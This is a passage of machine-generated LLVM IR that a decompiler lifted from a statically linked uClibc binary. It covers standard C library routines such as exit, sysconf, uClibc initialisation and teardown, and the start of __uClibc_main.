  store i32 %v0_804b3b3, i32* %eax.global-to-local, align 4
  %v1_804b3b5 = trunc i32 %v0_804b3b3 to i8
  %v6_804b3b5 = icmp eq i8 %v1_804b3b5, 0
  %v2_804b3b7 = zext i1 %v6_804b3b5 to i32
  %v1_804b3b94 = or i32 %v2_804b3b7, -2147483648
  store i32 %v1_804b3b94, i32* %ebx.global-to-local, align 4
  %v5_804b3bf = icmp eq i8 %tmp37, 0
  br i1 %v5_804b3bf, label %dec_label_pc_804b3d7, label %dec_label_pc_804b3c6

dec_label_pc_804b3c6:                             ; preds = %dec_label_pc_804b3b3
  %v0_804b3c6 = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_804b3c6, %v1_804b3b94
  br i1 %tmp59, label %dec_label_pc_804b3ca, label %dec_label_pc_804b3d7

dec_label_pc_804b3ca:                             ; preds = %dec_label_pc_804b3c6
  %v1_804b3ca = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_804b3ca, i32* %eax.global-to-local, align 4
  %v0_804b3cf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b3cf, i32* @edx, align 4
  %v1_804b3d1 = inttoptr i32 %v1_804b3ca to i32*
  store i32 34, i32* %v1_804b3d1, align 4
  %v0_804b3d7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804b3d7

dec_label_pc_804b3d7:                             ; preds = %dec_label_pc_804b3c6, %dec_label_pc_804b3b3, %dec_label_pc_804b3ca
  %v0_804b3d7 = phi i32 [ %v0_804b3b3, %dec_label_pc_804b3c6 ], [ %v0_804b3b3, %dec_label_pc_804b3b3 ], [ %v0_804b3d7.pre, %dec_label_pc_804b3ca ]
  store i32 %v0_804b3d7, i32* %eax.global-to-local, align 4
  %v3_804b3d9 = trunc i32 %v0_804b3d7 to i8
  %v4_804b3d9 = icmp eq i8 %v3_804b3d9, 0
  %v0_804b3e2.pre = load i32, i32* @edx, align 4
  br i1 %v4_804b3d9, label %dec_label_pc_804b3df, label %dec_label_pc_804b3dd

dec_label_pc_804b3dd:                             ; preds = %dec_label_pc_804b3d7
  %v1_804b3dd = sub i32 0, %v0_804b3e2.pre
  store i32 %v1_804b3dd, i32* @edx, align 4
  br label %dec_label_pc_804b3df

dec_label_pc_804b3df:                             ; preds = %dec_label_pc_804b3d7, %dec_label_pc_804b3dd
  %v0_804b3e2 = phi i32 [ %v1_804b3dd, %dec_label_pc_804b3dd ], [ %v0_804b3e2.pre, %dec_label_pc_804b3d7 ]
  store i32 %v0_804b3e2, i32* %eax.global-to-local, align 4
  %v2_804b3e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b3e4, i32* @ebx, align 4
  ret i32 %v0_804b3e2

; uselistorder directives
  uselistorder i32 %v0_804b3e2, { 1, 0 }
  uselistorder i32 %v0_804b3d7, { 1, 0 }
  uselistorder i32 %v0_804b378, { 0, 2, 1 }
  uselistorder i32 %v1_804b377, { 1, 0 }
  uselistorder i32 %v2_804b373, { 1, 0 }
  uselistorder i32 %v1_804b370, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804b39f, { 1, 0 }
  uselistorder i32 %v0_804b358, { 1, 0 }
  uselistorder i32 %v4_804b386, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_804b34a, { 1, 0, 2 }
  uselistorder i32 %v2_804b32e, { 1, 0 }
  uselistorder i32 %v1_804b327, { 1, 0 }
  uselistorder i32 %v1_804b320, { 1, 0, 2 }
  uselistorder i32 %v0_804b31f, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804b2ee.lcssa, { 1, 0 }
  uselistorder i32 %v0_804b2ed.lcssa, { 1, 0 }
  uselistorder i32 %v1_804b2ed, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804b2e1, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_804b2db, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3df, { 1, 0 }
  uselistorder label %dec_label_pc_804b3d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b3b3, { 1, 0 }
  uselistorder label %dec_label_pc_804b370, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b35a, { 1, 0 }
  uselistorder label %dec_label_pc_804b33b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b331, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b30d, { 1, 0 }
  uselistorder label %dec_label_pc_804b30c, { 1, 0 }
  uselistorder label %dec_label_pc_804b2ed, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804b3ff = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b3ff, i32* @ebx, align 4
  %v2_804b404 = call i32 @__pthread_return_void(i32 %v2_804b3ff, i32 134526427)
  %v1_804b410 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052140.66 to i32))
  %v0_804b415 = load i32, i32* @global_var_8052504.67, align 4
  store i32 %v0_804b415, i32* @eax, align 4
  %v1_804b41d = icmp eq i32 %v0_804b415, 0
  br i1 %v1_804b41d, label %dec_label_pc_804b42a, label %dec_label_pc_804b421

dec_label_pc_804b421:                             ; preds = %entry
  %v0_804b424 = load i32, i32* @esi, align 4
  %v1_804b425 = call i32 @unknown_0(i32 %v0_804b424)
  store i32 %v1_804b425, i32* @eax, align 4
  br label %dec_label_pc_804b42a

dec_label_pc_804b42a:                             ; preds = %entry, %dec_label_pc_804b421
  %v2_804b42f = call i32 @__pthread_return_void(i32 %v2_804b3ff, i32 1)
  %v0_804b434 = call i32 @__GI___uClibc_fini()
  %v0_804b445 = call i32 @_stdio_term()
  %v0_804b44d = load i32, i32* @esi, align 4
  %v1_804b44e = call i32 @__GI__exit(i32 %v0_804b44d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_804b42a, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_804b473 [
    i32 0, label %dec_label_pc_804b483
    i32 1, label %dec_label_pc_804b568
    i32 2, label %dec_label_pc_804b48d
    i32 3, label %dec_label_pc_804b497
    i32 4, label %dec_label_pc_804b4a1
    i32 5, label %dec_label_pc_804b537
    i32 6, label %dec_label_pc_804b4a9
    i32 7, label %dec_label_pc_804b469
    i32 8, label %dec_label_pc_804b469
    i32 9, label %dec_label_pc_804b469
    i32 10, label %dec_label_pc_804b469
    i32 11, label %dec_label_pc_804b469
    i32 12, label %dec_label_pc_804b469
    i32 13, label %dec_label_pc_804b469
    i32 14, label %dec_label_pc_804b469
    i32 15, label %dec_label_pc_804b469
    i32 16, label %dec_label_pc_804b469
    i32 17, label %dec_label_pc_804b469
    i32 18, label %dec_label_pc_804b469
    i32 19, label %dec_label_pc_804b469
    i32 20, label %dec_label_pc_804b469
    i32 21, label %dec_label_pc_804b469
    i32 22, label %dec_label_pc_804b469
    i32 23, label %dec_label_pc_804b568
    i32 24, label %dec_label_pc_804b568
    i32 25, label %dec_label_pc_804b574
    i32 26, label %dec_label_pc_804b545
    i32 27, label %dec_label_pc_804b568
    i32 28, label %dec_label_pc_804b4bb
    i32 29, label %dec_label_pc_804b53e
    i32 30, label %dec_label_pc_804b4b3
    i32 31, label %dec_label_pc_804b553
    i32 32, label %dec_label_pc_804b568
    i32 33, label %dec_label_pc_804b568
    i32 34, label %dec_label_pc_804b568
    i32 35, label %dec_label_pc_804b54c
    i32 36, label %dec_label_pc_804b57b
    i32 37, label %dec_label_pc_804b582
    i32 38, label %dec_label_pc_804b57b
    i32 39, label %dec_label_pc_804b4c5
    i32 40, label %dec_label_pc_804b589
    i32 41, label %dec_label_pc_804b568
    i32 42, label %dec_label_pc_804b553
    i32 43, label %dec_label_pc_804b582
    i32 44, label %dec_label_pc_804b590
    i32 45, label %dec_label_pc_804b582
    i32 46, label %dec_label_pc_804b53e
    i32 47, label %dec_label_pc_804b53e
    i32 48, label %dec_label_pc_804b53e
    i32 49, label %dec_label_pc_804b568
    i32 50, label %dec_label_pc_804b568
    i32 51, label %dec_label_pc_804b53e
    i32 52, label %dec_label_pc_804b53e
    i32 53, label %dec_label_pc_804b568
    i32 54, label %dec_label_pc_804b568
    i32 55, label %dec_label_pc_804b568
    i32 56, label %dec_label_pc_804b568
    i32 57, label %dec_label_pc_804b568
    i32 58, label %dec_label_pc_804b568
    i32 59, label %dec_label_pc_804b568
    i32 60, label %dec_label_pc_804b568
    i32 61, label %dec_label_pc_804b568
    i32 62, label %dec_label_pc_804b568
    i32 63, label %dec_label_pc_804b568
    i32 64, label %dec_label_pc_804b568
    i32 65, label %dec_label_pc_804b568
    i32 66, label %dec_label_pc_804b568
    i32 67, label %dec_label_pc_804b469
    i32 68, label %dec_label_pc_804b469
    i32 69, label %dec_label_pc_804b54c
    i32 70, label %dec_label_pc_804b54c
    i32 71, label %dec_label_pc_804b54c
    i32 72, label %dec_label_pc_804b553
    i32 73, label %dec_label_pc_804b55a
    i32 74, label %dec_label_pc_804b561
    i32 75, label %dec_label_pc_804b4cf
    i32 76, label %dec_label_pc_804b561
    i32 77, label %dec_label_pc_804b469
    i32 78, label %dec_label_pc_804b469
    i32 79, label %dec_label_pc_804b469
    i32 80, label %dec_label_pc_804b469
    i32 81, label %dec_label_pc_804b469
    i32 82, label %dec_label_pc_804b469
    i32 83, label %dec_label_pc_804b469
    i32 84, label %dec_label_pc_804b469
    i32 85, label %dec_label_pc_804b568
    i32 86, label %dec_label_pc_804b568
    i32 87, label %dec_label_pc_804b545
    i32 88, label %dec_label_pc_804b4d9
    i32 89, label %dec_label_pc_804b4e3
    i32 90, label %dec_label_pc_804b55a
    i32 91, label %dec_label_pc_804b469
    i32 92, label %dec_label_pc_804b469
    i32 93, label %dec_label_pc_804b469
    i32 94, label %dec_label_pc_804b469
    i32 95, label %dec_label_pc_804b53e
    i32 96, label %dec_label_pc_804b568
    i32 97, label %dec_label_pc_804b568
    i32 98, label %dec_label_pc_804b469
    i32 99, label %dec_label_pc_804b469
    i32 100, label %dec_label_pc_804b469
    i32 101, label %dec_label_pc_804b4ed
    i32 102, label %dec_label_pc_804b530
    i32 103, label %dec_label_pc_804b56d
    i32 104, label %dec_label_pc_804b545
    i32 105, label %dec_label_pc_804b4f7
    i32 106, label %dec_label_pc_804b553
    i32 107, label %dec_label_pc_804b553
    i32 108, label %dec_label_pc_804b537
    i32 109, label %dec_label_pc_804b574
    i32 110, label %dec_label_pc_804b590
    i32 111, label %dec_label_pc_804b530
    i32 112, label %dec_label_pc_804b56d
    i32 113, label %dec_label_pc_804b590
    i32 114, label %dec_label_pc_804b501
    i32 115, label %dec_label_pc_804b589
    i32 116, label %dec_label_pc_804b568
    i32 117, label %dec_label_pc_804b568
    i32 118, label %dec_label_pc_804b50b
    i32 119, label %dec_label_pc_804b515
    i32 120, label %dec_label_pc_804b582
    i32 121, label %dec_label_pc_804b545
    i32 122, label %dec_label_pc_804b545
    i32 123, label %dec_label_pc_804b545
    i32 124, label %dec_label_pc_804b545
    i32 125, label %dec_label_pc_804b469
    i32 126, label %dec_label_pc_804b469
    i32 127, label %dec_label_pc_804b568
    i32 128, label %dec_label_pc_804b568
    i32 129, label %dec_label_pc_804b469
    i32 130, label %dec_label_pc_804b469
    i32 131, label %dec_label_pc_804b568
    i32 149, label %dec_label_pc_804b51c
  ]

dec_label_pc_804b469:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b473:                             ; preds = %entry
  %v1_804b473 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804b478 = inttoptr i32 %v1_804b473 to i32*
  store i32 22, i32* %v1_804b478, align 4
  br label %dec_label_pc_804b568

dec_label_pc_804b483:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b48d:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b497:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4a1:                             ; preds = %entry
  %v0_804b4a4 = call i32 @getdtablesize()
  br label %dec_label_pc_804b4a9

dec_label_pc_804b4a9:                             ; preds = %entry, %dec_label_pc_804b4a1
  br label %dec_label_pc_804b595

dec_label_pc_804b4b3:                             ; preds = %entry
  %v0_804b4b6 = call i32 @__GI_getpagesize()
  br label %dec_label_pc_804b4bb

dec_label_pc_804b4bb:                             ; preds = %entry, %dec_label_pc_804b4b3
  br label %dec_label_pc_804b595

dec_label_pc_804b4c5:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4cf:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4d9:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4e3:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4ed:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b4f7:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b501:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b50b:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b515:                             ; preds = %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b51c:                             ; preds = %entry
  %v5_804b522 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804b52a = icmp slt i32 %v5_804b522, 0
  %v1_804b52c = icmp eq i1 %v2_804b52a, false
  br i1 %v1_804b52c, label %dec_label_pc_804b53e, label %dec_label_pc_804b568

dec_label_pc_804b530:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b537:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b53e:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b51c
  br label %dec_label_pc_804b595

dec_label_pc_804b545:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b54c:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b553:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b55a:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b561:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b568:                             ; preds = %dec_label_pc_804b51c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b473
  br label %dec_label_pc_804b595

dec_label_pc_804b56d:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b574:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b57b:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b582:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b589:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b590:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b595

dec_label_pc_804b595:                             ; preds = %dec_label_pc_804b589, %dec_label_pc_804b582, %dec_label_pc_804b57b, %dec_label_pc_804b574, %dec_label_pc_804b56d, %dec_label_pc_804b561, %dec_label_pc_804b55a, %dec_label_pc_804b553, %dec_label_pc_804b54c, %dec_label_pc_804b545, %dec_label_pc_804b537, %dec_label_pc_804b530, %dec_label_pc_804b53e, %dec_label_pc_804b515, %dec_label_pc_804b50b, %dec_label_pc_804b501, %dec_label_pc_804b4f7, %dec_label_pc_804b4ed, %dec_label_pc_804b4e3, %dec_label_pc_804b4d9, %dec_label_pc_804b4cf, %dec_label_pc_804b4c5, %dec_label_pc_804b4bb, %dec_label_pc_804b4a9, %dec_label_pc_804b497, %dec_label_pc_804b48d, %dec_label_pc_804b483, %dec_label_pc_804b469, %dec_label_pc_804b568, %dec_label_pc_804b590
  %v0_804b598 = phi i32 [ 255, %dec_label_pc_804b589 ], [ 2048, %dec_label_pc_804b582 ], [ 99, %dec_label_pc_804b57b ], [ 20, %dec_label_pc_804b574 ], [ -128, %dec_label_pc_804b56d ], [ 1024, %dec_label_pc_804b561 ], [ 4, %dec_label_pc_804b55a ], [ 32, %dec_label_pc_804b553 ], [ 256, %dec_label_pc_804b54c ], [ 2147483647, %dec_label_pc_804b545 ], [ 16, %dec_label_pc_804b537 ], [ 127, %dec_label_pc_804b530 ], [ 200112, %dec_label_pc_804b53e ], [ 9, %dec_label_pc_804b515 ], [ 65535, %dec_label_pc_804b50b ], [ -32768, %dec_label_pc_804b501 ], [ -2147483648, %dec_label_pc_804b4f7 ], [ 8, %dec_label_pc_804b4ed ], [ 500, %dec_label_pc_804b4e3 ], [ 4096, %dec_label_pc_804b4d9 ], [ 16384, %dec_label_pc_804b4cf ], [ 1000, %dec_label_pc_804b4c5 ], [ 32768, %dec_label_pc_804b4bb ], [ 6, %dec_label_pc_804b4a9 ], [ 65536, %dec_label_pc_804b497 ], [ 100, %dec_label_pc_804b48d ], [ 131072, %dec_label_pc_804b483 ], [ 1, %dec_label_pc_804b469 ], [ -1, %dec_label_pc_804b568 ], [ 32767, %dec_label_pc_804b590 ]
  ret i32 %v0_804b598

; uselistorder directives
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 30, { 5, 1, 0, 3, 4, 2 }
  uselistorder label %dec_label_pc_804b595, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804b568, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804b53e, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b4bb, { 1, 0 }
  uselistorder label %dec_label_pc_804b4a9, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b59c = load i32, i32* @ebx, align 4
  store i32 %v0_804b59c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b5b0, label %dec_label_pc_804b5bd

dec_label_pc_804b5b0:                             ; preds = %entry, %dec_label_pc_804b5b0
  %v1_804b5b78 = phi i32 [ %v1_804b5b7, %dec_label_pc_804b5b0 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804b5b7.70 to i32), i32* %stack_var_-16, align 4
  %v5_804b5b0 = mul i32 %v1_804b5b78, 4
  %v6_804b5b0 = add i32 %v5_804b5b0, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b5b0 = inttoptr i32 %v6_804b5b0 to i32*
  %v8_804b5b0 = load i32, i32* %v7_804b5b0, align 4
  call void @__pseudo_call(i32 %v8_804b5b0)
  %v0_804b5b7.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b5b7 = add i32 %v0_804b5b7.pre, -1
  store i32 %v1_804b5b7, i32* %ebx.global-to-local, align 4
  %v10_804b5b8 = icmp eq i32 %v0_804b5b7.pre, 0
  %v1_804b5bb = icmp eq i1 %v10_804b5b8, false
  br i1 %v1_804b5bb, label %dec_label_pc_804b5b0, label %dec_label_pc_804b5bd

dec_label_pc_804b5bd:                             ; preds = %dec_label_pc_804b5b0, %entry
  %v0_804b5bd = load i32, i32* @global_var_8052514.71, align 4
  %v1_804b5c2 = icmp eq i32 %v0_804b5bd, 0
  br i1 %v1_804b5c2, label %dec_label_pc_804b5c8, label %dec_label_pc_804b5c6

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b5bd
  %v0_804b5c6 = load i32, i32* %stack_var_-16, align 4
  %v1_804b5c6 = call i32 @unknown_0(i32 %v0_804b5c6)
  br label %dec_label_pc_804b5c8

dec_label_pc_804b5c8:                             ; preds = %dec_label_pc_804b5c6, %dec_label_pc_804b5bd
  %v0_804b5c8 = load i32, i32* @global_var_8052518.72, align 8
  %v1_804b5ce = icmp eq i32 %v0_804b5c8, 0
  br i1 %v1_804b5ce, label %dec_label_pc_804b5d7, label %dec_label_pc_804b5d2

dec_label_pc_804b5d2:                             ; preds = %dec_label_pc_804b5c8
  %v2_804b5d2 = load i32, i32* %stack_var_-16, align 4
  %v1_804b5d5 = call i32 @unknown_0(i32 %v2_804b5d2)
  br label %dec_label_pc_804b5d7

dec_label_pc_804b5d7:                             ; preds = %dec_label_pc_804b5d2, %dec_label_pc_804b5c8
  %v2_804b5d7 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804b5d7

; uselistorder directives
  uselistorder i32 %v1_804b5b7, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b5b0, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b5de = load i32, i32* @eax, align 4
  ret i32 %v0_804b5de
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5df = load i32, i32* @esi, align 4
  %v0_804b5e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804b5e0, i32* %stack_var_-8, align 4
  %v0_804b5e4 = load i32, i32* @eax, align 4
  store i32 %v0_804b5e4, i32* @esi, align 4
  %v0_804b5e6 = load i32, i32* @edx, align 4
  store i32 %v0_804b5e6, i32* @ebx, align 4
  %v4_804b5eb = call i32 @__libc_fcntl(i32 %v0_804b5e4, i32 1, i32 %tmp6)
  %v1_804b5f3 = add i32 %v4_804b5eb, 1
  %v8_804b5f3 = icmp eq i32 %v1_804b5f3, 0
  %v1_804b5f4 = icmp eq i1 %v8_804b5f3, false
  br i1 %v1_804b5f4, label %dec_label_pc_804b60f, label %dec_label_pc_804b5f6

dec_label_pc_804b5f6:                             ; preds = %entry
  %v0_804b5f8 = load i32, i32* @ebx, align 4
  %v5_804b5fe = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80505c0.73, i32 0, i32 0), i32 %v0_804b5f8, i32 %v1_804b5f3)
  %v1_804b606 = load i32, i32* @esi, align 4
  %v12_804b606 = icmp eq i32 %v5_804b5fe, %v1_804b606
  br i1 %v12_804b606, label %dec_label_pc_804b60f, label %dec_label_pc_804b60a

dec_label_pc_804b60a:                             ; preds = %dec_label_pc_804b5f6
  %v0_804b60a = call i32 @abort()
  br label %dec_label_pc_804b60f

dec_label_pc_804b60f:                             ; preds = %dec_label_pc_804b5f6, %entry, %dec_label_pc_804b60a
  %v2_804b60f = load i32, i32* %stack_var_-12, align 4
  %v2_804b610 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b610, i32* @ebx, align 4
  store i32 %v0_804b5df, i32* @esi, align 4
  ret i32 %v2_804b60f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b60f, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804b616 = load i8, i8* @global_var_805251c.74, align 4
  %v1_804b616 = icmp eq i8 %v0_804b616, 0
  %v1_804b61d = icmp eq i1 %v1_804b616, false
  br i1 %v1_804b61d, label %entry.dec_label_pc_804b64f_crit_edge, label %dec_label_pc_804b61f

entry.dec_label_pc_804b64f_crit_edge:             ; preds = %entry
  %v0_804b652.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804b64f

dec_label_pc_804b61f:                             ; preds = %entry
  store i8 1, i8* @global_var_805251c.74, align 4
  store i32 4096, i32* @global_var_8052510.75, align 16
  %v0_804b64a = call i32 @_stdio_init()
  br label %dec_label_pc_804b64f

dec_label_pc_804b64f:                             ; preds = %entry.dec_label_pc_804b64f_crit_edge, %dec_label_pc_804b61f
  %v0_804b652 = phi i32 [ %v0_804b652.pre, %entry.dec_label_pc_804b64f_crit_edge ], [ %v0_804b64a, %dec_label_pc_804b61f ]
  ret i32 %v0_804b652

; uselistorder directives
  uselistorder i8* @global_var_805251c.74, { 1, 0 }
  uselistorder label %dec_label_pc_804b64f, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8052508.76, align 8
  store i32 %arg6, i32* @global_var_8052518.72, align 8
  %v2_804b68a = mul i32 %arg2, 4
  %v3_804b68a = add i32 %tmp31, %v2_804b68a
  store i32 %v3_804b68a, i32* %edx.global-to-local, align 4
  %v1_804b68d = add i32 %v3_804b68a, 4
  store i32 %v1_804b68d, i32* @global_var_805250c.77, align 4
  %v3_804b695 = load i32, i32* %arg3, align 4
  %v14_804b695 = icmp eq i32 %v1_804b68d, %v3_804b695
  %v1_804b697 = icmp eq i1 %v14_804b695, false
  br i1 %v1_804b697, label %dec_label_pc_804b69f, label %dec_label_pc_804b699

dec_label_pc_804b699:                             ; preds = %entry
  store i32 %v3_804b68a, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b69f

dec_label_pc_804b69f:                             ; preds = %entry, %dec_label_pc_804b699
  %v0_804b69f = load i32, i32* @ecx, align 4
  store i32 %v0_804b69f, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_804b6a4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804b6a9 = bitcast i32* %stack_var_-136 to i8*
  %v4_804b6a9 = call i32 @__GI_memset(i8* %v3_804b6a9, i32 0, i32 120)
  %v0_804b6ae = load i32, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b6b6

dec_label_pc_804b6b6:                             ; preds = %dec_label_pc_804b6b6, %dec_label_pc_804b69f
  %v0_804b6b6 = phi i32 [ %v1_804b6b9, %dec_label_pc_804b6b6 ], [ %v0_804b6ae, %dec_label_pc_804b69f ]
  %v1_804b6b6 = inttoptr i32 %v0_804b6b6 to i32*
  %v2_804b6b6 = load i32, i32* %v1_804b6b6, align 4
  %v3_804b6b6 = icmp eq i32 %v2_804b6b6, 0
  %v1_804b6b9 = add i32 %v0_804b6b6, 4
  %v1_804b6bc = icmp eq i1 %v3_804b6b6, false
  br i1 %v1_804b6bc, label %dec_label_pc_804b6b6, label %dec_label_pc_804b6dd.preheader

dec_label_pc_804b6dd.preheader:                   ; preds = %dec_label_pc_804b6b6
  store i32 %v1_804b6b9, i32* @ebx, align 4
  %v1_804b6dd1 = inttoptr i32 %v1_804b6b9 to i32*
  %v2_804b6dd2 = load i32, i32* %v1_804b6dd1, align 4
  %v3_804b6dd3 = icmp eq i32 %v2_804b6dd2, 0
  %v1_804b6e010 = icmp eq i1 %v3_804b6dd3, false
  br i1 %v1_804b6e010, label %dec_label_pc_804b6c2.lr.ph, label %dec_label_pc_804b6e2

dec_label_pc_804b6c2.lr.ph:                       ; preds = %dec_label_pc_804b6dd.preheader
  %v3_804b6a2 = ptrtoint i32* %stack_var_-168 to i32
